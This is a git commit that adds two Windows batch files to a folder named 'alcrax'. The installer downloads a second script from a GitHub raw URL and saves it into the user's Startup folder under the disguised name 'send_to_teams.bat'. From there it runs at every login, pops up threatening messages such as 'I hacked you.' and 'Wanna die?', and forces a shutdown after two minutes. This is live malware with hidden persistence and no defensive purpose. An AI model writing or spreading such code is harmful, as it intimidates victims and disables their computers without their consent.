d0214c30b5dca670792b999e4d71d3b544b7ebda
sossinayDev <125735344+sossinayDev@users.noreply.github.com>
2024-08-21 12:59:59 +0200

    1

---
+++ stuff/alcrax/installer.bat
@@ -0,0 +1,5 @@
+start explorer
+start explorer
+
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sossinayDev/storage-9a/main/stuff/alcrax/main.bat' -OutFile '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\send_to_teams.bat'"
+
---
+++ stuff/alcrax/main.bat
@@ -0,0 +1,5 @@
+msg %username% I hacked you.
+msg %username% Wanna die?
+msg %username% I got you...
+
+shutdown /s /t 120
